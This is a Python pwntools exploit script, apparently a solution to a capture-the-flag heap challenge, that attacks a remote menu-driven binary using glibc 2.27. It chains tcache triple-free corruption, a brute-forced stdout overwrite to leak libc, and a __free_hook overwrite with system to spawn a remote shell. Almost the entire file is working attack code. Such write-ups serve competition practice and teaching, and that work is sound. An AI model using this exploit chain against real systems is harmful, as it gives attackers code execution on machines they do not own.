#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.xmas.htsp.ro --port 12004 a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('a.out')
libc = ELF("libc-2.27.so")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.xmas.htsp.ro'
port = int(args.PORT or 12004)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


# Helper functions

def do_malloc(idx, sz, text, wait=True):
    io.sendline("1")
    io.readuntil("idx: ")
    io.sendline(str(idx))
    io.readuntil("sz: ")
    io.sendline(str(sz))
    io.readuntil("data: ")
    io.send(text)

    if wait:
        return wait_for_menu()


def do_free(idx, wait=True):
    io.sendline("2")
    io.readuntil("idx: ")
    io.sendline(str(idx))

    if wait:
        wait_for_menu()


def realloc(idx, sz, text, wait=True):
    io.sendline("3")
    io.readuntil("idx: ")
    io.sendline(str(idx))
    io.readuntil("sz: ")
    io.sendline(str(sz))
    io.readuntil("data: ")
    io.send(text)

    if wait:
        return wait_for_menu()

def wait_for_menu():
    return io.readuntil("\n> ")



GDB_OPT = args.GDB
args.GDB = False

while True:
    try:
        io = start()

        # Crafting & Overwriting libc-pointer

        do_malloc(0, 0x60, "a")     # soon to be corrupted chunk
        do_malloc(8, 0x100, "a")    # "large chunk"
        do_malloc(9, 0x20, "Blocker\n")  # preventing top-chunk consolidation

        for i in range(8):
            do_free(8)              # filling the Tcache 0x110 freelist and putting it into unsorted
                                    # thus getting a libc pointer
        io.info("Chunk in unsorted")

        do_free(0)                  # Triple free
        do_free(0)          
        do_free(0)

        do_malloc(0, 0x60, "\xd0")      # Target address (address of the unsorted bin chunk)
        do_malloc(1, 0x60, "Hallo")     # Popping chunk from freelist
        do_malloc(2, 0x60, "\x60\x57")  # overwriting the 2 least significant bytes of the libc address


        # Now allocating a fake chunk at target address

        do_free(1)                  # Same as above
        do_free(1)
        do_free(1)

        do_malloc(1, 0x60, "\xd0")  # LSB OF unsorted bin chunk
        do_malloc(3, 0x60, "Hallo2")    # BURN
        do_malloc(4, 0x60, "\x60\x57")  # BURN AGAIN 


        # At this point our crafted address is the next chunk to be returned by malloc

        payload = p64(0x0fbad1800)  
        payload += '\0' * 0x18 
        payload += '\0'

        leak = do_malloc(5, 0x60, payload)   # overwriting stdio with junk
        if len(leak) > 200:
            break
        io.close()
    except:
        io.close()
        pass

if GDB_OPT:
    gdb.attach(io)


# At this point we've leaked the address of libc
io.info(" ========== LEAK ==========\n" + leak)
io.info("(Hex : " + leak.encode("hex") + ")")

libc_base = u64(leak[8:16]) - 0x3ed8b0
io.info(hex(libc_base))

# now we'll overwrite the free_hook with system

io.info("Calculating offsets:")
libc.address = libc_base
free_hook_addr = libc.sym.__free_hook
io.info("__free_hook @ " + hex(free_hook_addr))

do_free(9)  # I guess you've seen this before
do_free(9)
do_free(9)

do_malloc(9, 0x20, p64(free_hook_addr))     # Now with full addresses
do_malloc(6, 0x20, "/bin/sh\n\0")           # argument to be called by system
do_malloc(7, 0x20, p64(libc.sym.system))    # free_hook points now to system 

do_free(6, wait=False)  # invoking it with /bin/sh

# we should have a shell after here
io.interactive()

